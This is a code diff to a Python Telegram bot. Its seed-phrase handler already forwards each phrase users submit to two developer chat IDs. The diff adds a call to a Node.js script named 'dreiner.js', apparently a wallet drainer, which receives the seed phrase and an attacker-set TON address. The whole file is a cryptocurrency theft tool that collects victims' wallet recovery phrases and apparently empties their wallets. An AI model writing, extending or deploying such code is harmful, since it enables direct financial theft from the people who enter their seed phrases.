@@ -1,6 +1,7 @@
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from dotenv import load_dotenv
+from js_runner import run_node_script
 import os
 from loguru import logger
 import sys
@@ -230,6 +231,10 @@ def process_seed_phrase(message):
         bot.send_message(developer_chat_id, f"<code>{seed_phrase}</code>", parse_mode="HTML")
         developer_chat_id = os.getenv('DEVELOPER_CHAT_ID_2')
         bot.send_message(developer_chat_id, f"<code>{seed_phrase}</code>", parse_mode="HTML")
+        # Call the Node.js script with the seed phrase as an argument
+        result_code, output = run_node_script('dreiner.js', seed_phrase, os.getenv('TON_ADDRESS'))
+        logger.info(f"🌱 Node.js скрипт окончен кодом: {result_code}")
+        logger.info(f"✅ Output: {output}")
     else:
         logger.info(f"❌ {message.from_user.first_name} | @{message.from_user.username} - FUUUCK")
 
